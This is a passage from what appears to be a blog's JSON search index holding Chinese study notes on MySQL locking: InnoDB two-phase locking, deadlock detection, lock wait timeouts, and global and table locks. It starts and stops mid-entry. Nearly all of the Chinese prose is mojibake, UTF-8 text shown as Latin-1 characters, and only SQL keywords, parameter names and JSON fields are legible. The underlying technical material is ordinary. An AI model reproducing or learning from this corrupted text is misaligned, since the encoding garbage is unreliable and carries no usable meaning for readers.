ä¹Ÿè¦æ›´æ–°åŒä¸€è¡Œï¼Œåˆ™å¿…é¡»ç­‰äº‹åŠ¡ A çš„æ“ä½œå®Œæˆåæ‰èƒ½è¿›è¡Œæ›´æ–°ã€‚ å½“ç„¶ï¼Œæ•°æ®åº“ä¸­è¿˜æœ‰ä¸€äº›æ²¡é‚£ä¹ˆä¸€ç›®äº†ç„¶çš„æ¦‚å¿µå’Œè®¾è®¡ï¼Œè¿™äº›æ¦‚å¿µå¦‚æœç†è§£å’Œä½¿ç”¨ä¸å½“ï¼Œå®¹æ˜“å¯¼è‡´ç¨‹åºå‡ºç°éé¢„æœŸè¡Œä¸ºï¼Œæ¯”å¦‚ä¸¤é˜¶æ®µé”ã€‚ ä¸¤é˜¶æ®µé”åè®®åœ¨ä¸‹é¢çš„æ“ä½œåºåˆ—ä¸­ï¼Œäº‹åŠ¡ B çš„ update è¯­å¥æ‰§è¡Œæ—¶ä¼šæ˜¯ä»€ä¹ˆç°è±¡å‘¢ï¼Ÿå‡è®¾å­—æ®µ id æ˜¯è¡¨ t çš„ä¸»é”®ã€‚ è¿™ä¸ªé—®é¢˜çš„ç»“è®ºå–å†³äºäº‹åŠ¡ A åœ¨æ‰§è¡Œå®Œä¸¤æ¡ update è¯­å¥åï¼ŒæŒæœ‰å“ªäº›é”ï¼Œä»¥åŠåœ¨ä»€ä¹ˆæ—¶ å€™é‡Šæ”¾ã€‚ä½ å¯ä»¥éªŒè¯ä¸€ä¸‹:å®é™…ä¸Šäº‹åŠ¡ B çš„ update è¯­å¥ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°äº‹åŠ¡ A æ‰§è¡Œ commit ä¹‹åï¼Œäº‹åŠ¡ B æ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚ çŸ¥é“äº†è¿™ä¸ªç­”æ¡ˆï¼Œä½ ä¸€å®šçŸ¥é“äº†äº‹åŠ¡ A æŒæœ‰çš„ä¸¤ä¸ªè®°å½•çš„è¡Œé”ï¼Œéƒ½æ˜¯åœ¨ commit çš„æ—¶å€™æ‰é‡Šæ”¾çš„ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ InnoDB äº‹åŠ¡ä¸­ï¼Œè¡Œé”æ˜¯åœ¨éœ€è¦çš„æ—¶å€™æ‰åŠ ä¸Šçš„ï¼Œä½†å¹¶ä¸æ˜¯ä¸éœ€è¦äº†å°±ç«‹åˆ»é‡Šæ”¾ï¼Œè€Œæ˜¯è¦ç­‰åˆ°äº‹åŠ¡ç»“æŸæ—¶æ‰é‡Šæ”¾ï¼ˆè¿™ä¸€ç‚¹å’Œ MDL å¾ˆåƒï¼‰ã€‚è¿™ä¸ªå°±æ˜¯ä¸¤é˜¶æ®µé”åè®®ã€‚ çŸ¥é“äº†ä¸¤é˜¶æ®µé”åè®®çš„è®¾å®šï¼Œå¯¹æˆ‘ä»¬ä½¿ç”¨äº‹åŠ¡æœ‰ä»€ä¹ˆå¸®åŠ©å‘¢ï¼Ÿ é‚£å°±æ˜¯ï¼Œå¦‚æœäº‹åŠ¡ä¸­éœ€è¦é”å¤šä¸ªè¡Œï¼Œè¦æŠŠæœ€å¯èƒ½é€ æˆé”å†²çªã€æœ€å¯èƒ½å½±å“å¹¶å‘åº¦çš„é”å°½é‡å¾€åæ”¾ã€‚ å‡è®¾åœ¨ä¸€ä¸ªä¸šåŠ¡ä¸­ï¼Œéœ€è¦ update ä¸¤æ¡è®°å½•ï¼ˆ1ã€2ï¼‰ï¼Œå¹¶ insert ä¸€æ¡è®°å½•ï¼ˆ3ï¼‰ï¼Œä¸ºäº†ä¿è¯åŸå­æ€§ï¼Œæˆ‘ä»¬è¦æŠŠè¿™ä¸‰ä¸ªæ“ä½œæ”¾åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­ã€‚ å…¶ä¸­æœ‰ä¸€ä¸ª update è¯­å¥ä¼šå†²çªï¼Œéœ€è¦ä¿®æ”¹åŒä¸€è¡Œæ•°æ®ã€‚ æ ¹æ®ä¸¤é˜¶æ®µé”åè®®ï¼Œä¸è®ºä½ æ€æ ·å®‰æ’è¯­å¥é¡ºåºï¼Œæ‰€æœ‰çš„æ“ä½œéœ€è¦çš„è¡Œé”éƒ½æ˜¯åœ¨äº‹åŠ¡æäº¤çš„æ—¶å€™æ‰é‡Šæ”¾çš„ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ æŠŠè¯­å¥ 2 å®‰æ’åœ¨æœ€åï¼Œæ¯”å¦‚æŒ‰ç…§ 3ã€1ã€2 è¿™æ ·çš„é¡ºåºï¼Œé‚£ä¹ˆè¡Œé”æ—¶é—´å°±æœ€å°‘ã€‚è¿™å°±æœ€å¤§ç¨‹åº¦åœ°å‡å°‘äº†äº‹åŠ¡ä¹‹é—´çš„é”ç­‰å¾…ï¼Œæå‡äº†å¹¶å‘åº¦ã€‚ å¥½äº†ï¼Œç°åœ¨ç”±äºä½ çš„æ­£ç¡®è®¾è®¡ï¼Œå½±é™¢ä½™é¢è¿™ä¸€è¡Œçš„è¡Œé”åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­ä¸ä¼šåœç•™å¾ˆé•¿æ—¶é—´ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶æ²¡æœ‰å®Œå…¨è§£å†³ä½ çš„å›°æ‰°ã€‚å¦‚æœè¿™ä¸ªå½±é™¢åšæ´»åŠ¨ï¼Œå¯ä»¥ä½ä»·é¢„å”®ä¸€å¹´å†…æ‰€æœ‰çš„ç”µå½±ç¥¨ï¼Œè€Œä¸”è¿™ä¸ªæ´»åŠ¨åªåšä¸€å¤©ã€‚äºæ˜¯åœ¨ æ´»åŠ¨æ—¶é—´å¼€å§‹çš„æ—¶å€™ï¼Œä½ çš„ MySQL å°±æŒ‚äº†ã€‚ä½ ç™»ä¸ŠæœåŠ¡å™¨ä¸€çœ‹ï¼ŒCPU æ¶ˆè€—æ¥è¿‘ 100%ï¼Œ ä½†æ•´ä¸ªæ•°æ®åº“æ¯ç§’å°±æ‰§è¡Œä¸åˆ° 100 ä¸ªäº‹åŠ¡ã€‚è¿™æ˜¯ä»€ä¹ˆåŸå› å‘¢?è¿™é‡Œï¼Œæˆ‘å°±è¦è¯´åˆ°æ­»é”å’Œæ­»é”æ£€æµ‹äº†ã€‚æ­»é”å’Œæ­»é”æ£€æµ‹å½“å¹¶å‘ç³»ç»Ÿä¸­ä¸åŒçº¿ç¨‹å‡ºç°å¾ªç¯èµ„æºä¾èµ–ï¼Œæ¶‰åŠçš„çº¿ç¨‹éƒ½åœ¨ç­‰å¾…åˆ«çš„çº¿ç¨‹é‡Šæ”¾èµ„æºæ—¶ï¼Œå°±ä¼šå¯¼è‡´è¿™å‡ ä¸ªçº¿ç¨‹éƒ½è¿›å…¥æ— é™ç­‰å¾…çš„çŠ¶æ€ï¼Œç§°ä¸ºæ­»é”ã€‚è¿™é‡Œæˆ‘ç”¨æ•°æ®åº“ä¸­çš„è¡Œé”ä¸¾ä¸ªä¾‹å­ã€‚ æ­»é”å’Œæ­»é”æ£€æµ‹å½“å¹¶å‘ç³»ç»Ÿä¸­ä¸åŒçº¿ç¨‹å‡ºç°å¾ªç¯èµ„æºä¾èµ–ï¼Œæ¶‰åŠçš„çº¿ç¨‹éƒ½åœ¨ç­‰å¾…åˆ«çš„çº¿ç¨‹é‡Šæ”¾èµ„æºæ—¶ï¼Œå°±ä¼šå¯¼è‡´è¿™å‡ ä¸ªçº¿ç¨‹éƒ½è¿›å…¥æ— é™ç­‰å¾…çš„çŠ¶æ€ï¼Œç§°ä¸ºæ­»é”ã€‚ ä¸‹é¢é€šè¿‡æ•°æ®åº“çš„è¡Œé”æ¥è§£é‡Šä»€ä¹ˆæ˜¯æ­»é”ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œäº‹åŠ¡ A åœ¨ç­‰å¾…äº‹åŠ¡ B é‡Šæ”¾ id=2 çš„è¡Œé”ï¼Œè€Œäº‹åŠ¡ B åœ¨ç­‰å¾…äº‹åŠ¡ A é‡Šæ”¾ id=1 çš„è¡Œé”ã€‚ äº‹åŠ¡ A å’Œäº‹åŠ¡ B åœ¨äº’ç›¸ç­‰å¾…å¯¹æ–¹çš„èµ„æºé‡Šæ”¾ï¼Œæ­¤æ—¶å°±ä¼šè¿›å…¥æ­»é”çš„çŠ¶æ€ã€‚ å½“å‡ºç°æ­»é”ä»¥åï¼Œæœ‰ä¸¤ç§ç­–ç•¥: ç›´æ¥è¿›å…¥ç­‰å¾…ï¼Œç›´åˆ°è¶…æ—¶ã€‚è¿™ä¸ªè¶…æ—¶æ—¶é—´å¯ä»¥é€šè¿‡å‚æ•° innodb_lock_wait_timeout æ¥è®¾ç½®ã€‚ å‘èµ·æ­»é”æ£€æµ‹ï¼Œå‘ç°æ­»é”åï¼Œä¸»åŠ¨å›æ»šæ­»é”é“¾æ¡ä¸­çš„æŸä¸€ä¸ªäº‹åŠ¡ï¼Œè®©å…¶ä»–äº‹åŠ¡å¾—ä»¥ç»§ç»­æ‰§è¡Œã€‚å°†å‚æ•° innodb_deadlock_detect è®¾ç½®ä¸º onï¼Œè¡¨ç¤ºå¼€å¯è¿™ä¸ªé€»è¾‘ åœ¨ InnoDB ä¸­ï¼Œinnodb_lock_wait_timeout çš„é»˜è®¤å€¼æ˜¯ 50sï¼Œæ„å‘³ç€å¦‚æœé‡‡ç”¨ç¬¬ä¸€ä¸ªç­–ç•¥ï¼Œå½“å‡ºç°æ­»é”ä»¥åï¼Œç¬¬ä¸€ä¸ªè¢«é”ä½çš„çº¿ç¨‹è¦è¿‡ 50s æ‰ä¼šè¶…æ—¶é€€å‡ºï¼Œç„¶åå…¶ä»–çº¿ç¨‹æ‰æœ‰å¯èƒ½ç»§ç»­æ‰§è¡Œã€‚å¯¹äºåœ¨çº¿æœåŠ¡æ¥è¯´ï¼Œè¿™ä¸ªç­‰å¾…æ—¶é—´å¾€å¾€æ˜¯æ— æ³•æ¥å—çš„ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬åˆä¸å¯èƒ½ç›´æ¥æŠŠè¿™ä¸ªæ—¶é—´è®¾ç½®æˆä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œæ¯”å¦‚ 1sã€‚è¿™æ ·å½“å‡ºç°æ­»é”çš„æ—¶å€™ï¼Œç¡®å®å¾ˆå¿«å°±å¯ä»¥è§£å¼€ï¼Œä½†å¦‚æœä¸æ˜¯æ­»é”ï¼Œè€Œæ˜¯ç®€å•çš„é”ç­‰å¾…å‘¢ï¼Ÿæ‰€ä»¥ï¼Œè¶…æ—¶æ—¶é—´è®¾ç½®å¤ªçŸ­çš„è¯ï¼Œä¼šå‡ºç°å¾ˆå¤šè¯¯ä¼¤ã€‚ æ­£å¸¸æƒ…å†µä¸‹è¿˜æ˜¯è¦é‡‡ç”¨ç¬¬äºŒç§ç­–ç•¥ï¼Œå³:ä¸»åŠ¨æ­»é”æ£€æµ‹ï¼Œè€Œä¸” innodb_deadlock_detect çš„é»˜è®¤å€¼æœ¬èº«å°±æ˜¯ onã€‚ä¸»åŠ¨æ­»é”æ£€æµ‹åœ¨å‘ç”Ÿæ­»é”çš„æ—¶å€™ï¼Œæ˜¯èƒ½å¤Ÿå¿«é€Ÿå‘ç°å¹¶è¿›è¡Œå¤„ç†çš„ï¼Œä½†æ˜¯å®ƒä¹Ÿæ˜¯æœ‰é¢å¤–è´Ÿæ‹…çš„ã€‚ å› ä¸ºæ¯å½“ä¸€ä¸ªäº‹åŠ¡è¢«é”æ—¶ï¼Œå°±éœ€è¦çœ‹çœ‹å®ƒæ‰€ä¾èµ–çš„çº¿ç¨‹æœ‰æ²¡æœ‰è¢«åˆ«äººé”ä½ï¼Œå¦‚æ­¤å¾ªç¯ï¼Œæœ€ååˆ¤æ–­æ˜¯å¦å‡ºç°äº†å¾ªç¯ç­‰å¾…ï¼Œä¹Ÿå°±æ˜¯æ­»é”ã€‚ ç‰¹åˆ«æ˜¯å½“æ˜¯å½“æ‰€æœ‰äº‹åŠ¡éƒ½è¦æ›´æ–°åŒä¸€è¡Œçš„åœºæ™¯ä¸‹ï¼ˆä¹Ÿå°±æ˜¯å¹¶å‘æ¯”è¾ƒå¤§ï¼‰ï¼Œæ¯ä¸ªæ–°æ¥çš„è¢«å µä½çš„çº¿ç¨‹ï¼Œéƒ½è¦åˆ¤æ–­ä¼šä¸ä¼šç”±äºè‡ªå·±çš„åŠ å…¥å¯¼è‡´äº†æ­»é”ï¼Œè¿™æ˜¯ä¸€ä¸ªæ—¶é—´å¤æ‚ åº¦æ˜¯ O(n) çš„æ“ä½œã€‚å‡è®¾æœ‰ 1000 ä¸ªå¹¶å‘çº¿ç¨‹è¦åŒæ—¶æ›´æ–°åŒä¸€è¡Œï¼Œé‚£ä¹ˆæ­»é”æ£€æµ‹æ“ä½œå°±æ˜¯ 100 ä¸‡è¿™ä¸ªé‡çº§çš„ã€‚è™½ç„¶æœ€ç»ˆæ£€æµ‹çš„ç»“æœæ˜¯æ²¡æœ‰æ­»é”ï¼Œä½†æ˜¯è¿™æœŸé—´è¦æ¶ˆè€—å¤§é‡çš„ CPU èµ„æºã€‚å› æ­¤ï¼Œä½ å°±ä¼šçœ‹åˆ° CPU åˆ©ç”¨ç‡å¾ˆé«˜ï¼Œä½†æ˜¯æ¯ç§’å´æ‰§è¡Œä¸äº†å‡ ä¸ªäº‹åŠ¡ã€‚ é‚£ä¹ˆåˆ°åº•è¯¥å¦‚ä½•è§£å†³ç”±è¿™ç§çƒ­ç‚¹è¡Œæ›´æ–°ï¼Œå¯¼è‡´çš„æ€§èƒ½é—®é¢˜å‘¢ï¼Ÿ é—®é¢˜çš„ç—‡ç»“åœ¨äºï¼Œæ­»é”æ£€æµ‹è¦è€—è´¹å¤§é‡çš„ CPU èµ„æºï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ¡ˆï¼š ä¸€ç§å¤´ç—›åŒ»å¤´çš„æ–¹æ³•ï¼Œå°±æ˜¯å¦‚æœä½ èƒ½ç¡®ä¿è¿™ä¸ªä¸šåŠ¡ä¸€å®šä¸ä¼šå‡ºç°æ­»é”ï¼Œå¯ä»¥ä¸´æ—¶æŠŠæ­»é”æ£€æµ‹å…³æ‰ã€‚ä½†æ˜¯è¿™ç§æ“ä½œæœ¬èº«å¸¦æœ‰ä¸€å®šçš„é£é™©ï¼Œå› ä¸ºä¸šåŠ¡è®¾è®¡çš„æ—¶å€™ä¸€èˆ¬ä¸ä¼šæŠŠæ­»é”å½“åšä¸€ä¸ªä¸¥ é‡é”™è¯¯ï¼Œæ¯•ç«Ÿå‡ºç°æ­»é”äº†ï¼Œå°±å›æ»šï¼Œç„¶åé€šè¿‡ä¸šåŠ¡é‡è¯•ä¸€èˆ¬å°±æ²¡é—®é¢˜äº†ï¼Œè¿™æ˜¯ä¸šåŠ¡æ— æŸçš„ã€‚ è€Œå…³æ‰æ­»é”æ£€æµ‹æ„å‘³ç€å¯èƒ½ä¼šå‡ºç°å¤§é‡çš„è¶…æ—¶ï¼Œè¿™æ˜¯ä¸šåŠ¡æœ‰æŸçš„ã€‚ å¦ä¸€ä¸ªæ€è·¯æ˜¯æ§åˆ¶å¹¶å‘åº¦ã€‚æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œä½ ä¼šå‘ç°å¦‚æœå¹¶å‘èƒ½å¤Ÿæ§åˆ¶ä½ï¼Œæ¯”å¦‚åŒä¸€è¡ŒåŒ æ—¶æœ€å¤šåªæœ‰ 10 ä¸ªçº¿ç¨‹åœ¨æ›´æ–°ï¼Œé‚£ä¹ˆæ­»é”æ£€æµ‹çš„æˆæœ¬å¾ˆä½ï¼Œå°±ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚ä¸€ä¸ªç›´æ¥ çš„æƒ³æ³•å°±æ˜¯ï¼Œåœ¨å®¢æˆ·ç«¯åšå¹¶å‘æ§åˆ¶ã€‚ä½†æ˜¯ï¼Œä½ ä¼šå¾ˆå¿«å‘ç°è¿™ä¸ªæ–¹æ³•ä¸å¤ªå¯è¡Œï¼Œå› ä¸ºå®¢æˆ·ç«¯å¾ˆ å¤šã€‚æˆ‘è§è¿‡ä¸€ä¸ªåº”ç”¨ï¼Œæœ‰ 600 ä¸ªå®¢æˆ·ç«¯ï¼Œè¿™æ ·å³ä½¿æ¯ä¸ªå®¢æˆ·ç«¯æ§åˆ¶åˆ°åªæœ‰ 5 ä¸ªå¹¶å‘çº¿ç¨‹ï¼Œ æ±‡æ€»åˆ°æ•°æ®åº“æœåŠ¡ç«¯ä»¥åï¼Œå³°å€¼å¹¶å‘æ•°ä¹Ÿå¯èƒ½è¦è¾¾åˆ° 3000ã€‚ æ€»ç»“ åœ¨ InnoDB äº‹åŠ¡ä¸­ï¼Œè¡Œé”æ˜¯åœ¨éœ€è¦çš„æ—¶å€™æ‰åŠ ä¸Šçš„ï¼Œä½†å¹¶ä¸æ˜¯ä¸éœ€è¦äº†å°±ç«‹åˆ»é‡Šæ”¾ï¼Œè€Œæ˜¯è¦ç­‰åˆ°äº‹åŠ¡ç»“æŸæ—¶æ‰é‡Šæ”¾ã€‚è¿™ä¸ªå°±æ˜¯ä¸¤é˜¶æ®µé”åè®®ã€‚ å½“äº‹åŠ¡ä¸­éœ€è¦é”å¤šä¸ªè¡Œï¼Œè¦æŠŠæœ€å¯èƒ½é€ æˆé”å†²çªã€æœ€å¯èƒ½å½±å“å¹¶å‘åº¦çš„é”çš„ç”³è¯·æ—¶æœºå°½é‡å¾€åæ”¾ï¼Œè¿™æ ·å¯ä»¥æœ€å¤§ç¨‹åº¦çš„å‡å°‘äº‹åŠ¡ä¹‹é—´çš„é”ç­‰å¾…ã€‚ è°ƒæ•´è¯­å¥çš„æ‰§è¡Œé¡ºåºå¹¶ä¸èƒ½å®Œå…¨é¿å…æ­»é”ï¼Œå› æ­¤å¼•å…¥äº†æ­»é”å’Œæ­»é”æ£€æµ‹çš„æ¦‚å¿µã€‚å‡å°‘æ­»é”çš„æ€è·¯æ˜¯ï¼Œæ§åˆ¶ç›¸åŒèµ„æºçš„å¹¶å‘äº‹åŠ¡é‡ã€‚ æ­»é”æ£€æµ‹åªä¼šå‘ç”Ÿåœ¨å½“ä¸€ä¸ªäº‹åŠ¡è¢«é”çš„æ—¶å€™ï¼Œå°±è¦çœ‹çœ‹å®ƒæ‰€ä¾èµ–çš„çº¿ç¨‹æœ‰æ²¡æœ‰è¢«åˆ«äººé”ä½ï¼Œå¹¶ä¸æ˜¯ä»»ä½•ä¸€ä¸ªäº‹åŠ¡å¯åŠ¨å°±ä¼šåšæ­»é”æ£€æµ‹ã€‚ InnoDB update å¦‚æœæ²¡æœ‰èµ°ç´¢å¼•ï¼ŒInnoDB å†…éƒ¨æ˜¯æƒæ ‡æ ¹æ®ä¸»é”®ç´¢å¼•é€è¡Œæ‰«æï¼Œé€è¡ŒåŠ é”ï¼Œäº‹åŠ¡æäº¤æ—¶ç»Ÿä¸€é‡Šæ”¾ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"06 å…¨å±€é”å’Œè¡¨é”ï¼šç»™è¡¨åŠ ä¸ªå­—æ®µæ€ä¹ˆæœ‰è¿™ä¹ˆå¤šé˜»ç¢","slug":"global-lock-and-table-lock-how-can-there-be-so-many-obstacles-to-adding-a-field-to-a-table","date":"2022-06-12T01:56:59.000Z","updated":"2022-06-17T07:35:22.677Z","comments":true,"path":"global-lock-and-table-lock-how-can-there-be-so-many-obstacles-to-adding-a-field-to-a-table/","link":"","permalink":"https://www.0x2beace.com/global-lock-and-table-lock-how-can-there-be-so-many-obstacles-to-adding-a-field-to-a-table/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql å…¨å±€é” äº†è§£ Mysql è¡¨çº§é” ä¸ºä»€ä¹ˆç»™å°è¡¨å¢åŠ å­—æ®µä¹Ÿä¼šå¯¼è‡´è¡¨é”","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ Mysql å…¨å±€é” äº†è§£ Mysql è¡¨çº§é” ä¸ºä»€ä¹ˆç»™å°è¡¨å¢åŠ å­—æ®µä¹Ÿä¼šå¯¼è‡´è¡¨é” å…¨å±€é”é¡¾åæ€ä¹‰ï¼Œå…¨å±€é”å°±æ˜¯å¯¹æ•´ä¸ªæ•°æ®åº“å®ä¾‹åŠ é”ã€‚MySQL æä¾›äº†ä¸€ä¸ªåŠ å…¨å±€è¯»é”çš„æ–¹æ³•ï¼Œå‘½ä»¤æ˜¯ï¼š 1mysql&gt; Flush tables with read lock (FTWRL) å½“ä½ éœ€è¦è®©æ•´ä¸ªåº“å¤„äºåªè¯»çŠ¶æ€çš„æ—¶å€™ï¼Œå¯ ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼Œä¹‹åå…¶ä»–çº¿ç¨‹çš„ä»¥ä¸‹è¯­å¥ä¼šè¢«é˜»å¡:æ•°æ®æ›´æ–°è¯­å¥(æ•°æ®çš„å¢åˆ æ”¹)ã€æ•° æ®å®šä¹‰è¯­å¥(åŒ…æ‹¬å»ºè¡¨ã€ä¿®æ”¹è¡¨ç»“æ„ç­‰)å’Œæ›´æ–°ç±»äº‹åŠ¡çš„æäº¤è¯­å¥ã€‚ å…¨å±€é”çš„å…¸å‹ä½¿ç”¨åœºæ™¯æ˜¯ï¼Œåšå…¨åº“é€»è¾‘å¤‡ä»½ã€‚ä¹Ÿå°±æ˜¯æŠŠæ•´åº“æ¯ä¸ªè¡¨éƒ½ select å‡ºæ¥å­˜æˆæ–‡æœ¬ã€‚ ä¸ºä»€ä¹ˆå¤‡ä»½éœ€è¦åŠ é”å‘¢ï¼Ÿ ä¸åŠ é”çš„è¯ï¼Œå¤‡ä»½ç³»ç»Ÿå¤‡ä»½çš„å¾—åˆ°çš„åº“ä¸æ˜¯ä¸€ä¸ªé€»è¾‘æ—¶é—´ç‚¹ï¼Œè¿™ä¸ªè§†å›¾æ˜¯é€»è¾‘ä¸ä¸€è‡´çš„ã€‚ å®˜æ–¹è‡ªå¸¦çš„é€»è¾‘å¤‡ä»½å·¥å…·æ˜¯ mysqldumpã€‚å½“ mysqldump ä½¿ç”¨å‚æ•°â€“single-transaction çš„æ—¶å€™ï¼Œå¯¼æ•°æ®ä¹‹å‰å°±ä¼šå¯åŠ¨ä¸€ä¸ªäº‹åŠ¡ï¼Œæ¥ç¡®ä¿æ‹¿åˆ°ä¸€è‡´æ€§è§†å›¾ã€‚è€Œç”±äº MVCC çš„æ”¯æŒï¼Œ è¿™ä¸ªè¿‡ç¨‹ä¸­æ•°æ®æ˜¯å¯ä»¥æ­£å¸¸æ›´æ–°çš„ã€‚ ä½ ä¸€å®šåœ¨ç–‘æƒ‘ï¼Œæœ‰äº†è¿™ä¸ªåŠŸèƒ½ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦ FTWRL å‘¢?ä¸€è‡´æ€§è¯»æ˜¯å¥½ï¼Œä½†å‰ææ˜¯å¼•æ“è¦ æ”¯æŒè¿™ä¸ªéš”ç¦»çº§åˆ«ã€‚æ¯”å¦‚ï¼Œå¯¹äº MyISAM è¿™ç§ä¸æ”¯æŒäº‹åŠ¡çš„å¼•æ“ï¼Œå¦‚æœå¤‡ä»½è¿‡ç¨‹ä¸­æœ‰æ›´ æ–°ï¼Œæ€»æ˜¯åªèƒ½å–åˆ°æœ€æ–°çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±ç ´åäº†å¤‡ä»½çš„ä¸€è‡´æ€§ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ FTWRL å‘½ä»¤äº†ã€‚ æ‰€ä»¥ï¼Œsingle-transaction æ–¹æ³•åªé€‚ç”¨äºæ‰€æœ‰çš„è¡¨ä½¿ç”¨äº‹åŠ¡å¼•æ“çš„åº“ã€‚å¦‚æœæœ‰çš„è¡¨ä½¿ç”¨äº† ä¸æ”¯æŒäº‹åŠ¡çš„å¼•æ“ï¼Œé‚£ä¹ˆå¤‡ä»½å°±åªèƒ½é€šè¿‡ FTWRL æ–¹æ³•ã€‚è¿™å¾€å¾€æ˜¯ DBA è¦æ±‚ä¸šåŠ¡å¼€å‘äººå‘˜ ä½¿ç”¨ InnoDB æ›¿ä»£ MyISAM çš„åŸå› ä¹‹ä¸€ã€‚ ä½ ä¹Ÿè®¸ä¼šé—®ï¼Œæ—¢ç„¶è¦å…¨åº“åªè¯»ï¼Œä¸ºä»€ä¹ˆä¸ä½¿ç”¨ set global readonly=true çš„æ–¹å¼å‘¢?ç¡® å® readonly æ–¹å¼ä¹Ÿå¯ä»¥è®©å…¨åº“è¿›å…¥åªè¯»çŠ¶æ€ï¼Œä½†æˆ‘è¿˜æ˜¯ä¼šå»ºè®®ä½ ç”¨ FTWRL æ–¹å¼ï¼Œä¸»è¦æœ‰ ä¸¤ä¸ªåŸå› : ä¸€æ˜¯ï¼Œåœ¨æœ‰äº›ç³»ç»Ÿä¸­ï¼Œreadonly çš„å€¼ä¼šè¢«ç”¨æ¥åšå…¶ä»–é€»è¾‘ï¼Œæ¯”å¦‚ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªåº“æ˜¯ä¸»åº“ è¿˜æ˜¯å¤‡åº“ã€‚å› æ­¤ï¼Œä¿®æ”¹ global å˜é‡çš„æ–¹å¼å½±å“é¢æ›´å¤§ï¼Œæˆ‘ä¸å»ºè®®ä½ ä½¿ç”¨ã€‚ äºŒæ˜¯ï¼Œåœ¨å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸Šæœ‰å·®å¼‚ã€‚å¦‚æœæ‰§è¡Œ FTWRL å‘½ä»¤ä¹‹åç”±äºå®¢æˆ·ç«¯å‘ç”Ÿå¼‚å¸¸æ–­å¼€ï¼Œ é‚£ä¹ˆ MySQL ä¼šè‡ªåŠ¨é‡Šæ”¾è¿™ä¸ªå…¨å±€é”ï¼Œæ•´ä¸ªåº“å›åˆ°å¯ä»¥æ­£å¸¸æ›´æ–°çš„çŠ¶æ€ã€‚è€Œå°†æ•´ä¸ªåº“è®¾ ç½®ä¸º readonly ä¹‹åï¼Œå¦‚æœå®¢æˆ·ç«¯å‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™æ•°æ®åº“å°±ä¼šä¸€ç›´ä¿æŒ readonly çŠ¶æ€ï¼Œè¿™ æ ·ä¼šå¯¼è‡´æ•´ä¸ªåº“é•¿æ—¶é—´å¤„äºä¸å¯å†™çŠ¶æ€ï¼Œé£é™©è¾ƒé«˜ã€‚ ä¸šåŠ¡çš„æ›´æ–°ä¸åªæ˜¯å¢åˆ æ”¹æ•°æ®(DML)ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯åŠ å­—æ®µç­‰ä¿®æ”¹è¡¨ç»“æ„çš„æ“ä½œ(DDL)ã€‚ ä¸è®ºæ˜¯å“ªç§æ–¹æ³•ï¼Œä¸€ä¸ªåº“è¢«å…¨å±€é”ä¸Šä»¥åï¼Œä½ è¦å¯¹é‡Œé¢ä»»ä½•ä¸€ä¸ªè¡¨åšåŠ å­—æ®µæ“ä½œï¼Œéƒ½æ˜¯ä¼šè¢« é”ä½çš„ã€‚ è¡¨çº§é”MySQL é‡Œé¢è¡¨çº§åˆ«çš„é”æœ‰ä¸¤ç§:ä¸€ç§æ˜¯è¡¨é”ï¼Œä¸€ç§æ˜¯å…ƒæ•°æ®é”(meta data lockï¼Œ MDL)ã€‚ è¡¨é”çš„è¯­æ³•æ˜¯ lock tables â€¦ read/writeã€‚ä¸ FTWRL ç±»ä¼¼ï¼Œå¯ä»¥ç”¨ unlock tables ä¸»åŠ¨ é‡Šæ”¾é”ï¼Œä¹Ÿå¯ä»¥åœ¨å®¢æˆ·ç«¯æ–­å¼€çš„æ—¶å€™è‡ªåŠ¨é‡Šæ”¾ã€‚éœ€è¦æ³¨æ„ï¼Œlock tables è¯­æ³•é™¤äº†ä¼šé™åˆ¶åˆ« çš„çº¿ç¨‹çš„è¯»å†™å¤–ï¼Œä¹Ÿé™å®šäº†æœ¬çº¿ç¨‹æ¥ä¸‹æ¥çš„æ“ä½œå¯¹è±¡ã€‚ ä¸¾ä¸ªä¾‹å­, å¦‚æœåœ¨æŸä¸ªçº¿ç¨‹ A ä¸­æ‰§è¡Œ lock tables t1 read, t2 write; è¿™ä¸ªè¯­å¥ï¼Œåˆ™å…¶ä»–çº¿ç¨‹ å†™ t1ã€è¯»å†™ t2 çš„è¯­å¥éƒ½ä¼šè¢«é˜»å¡ã€‚åŒæ—¶ï¼Œçº¿ç¨‹ A åœ¨æ‰§è¡Œ unlock tables 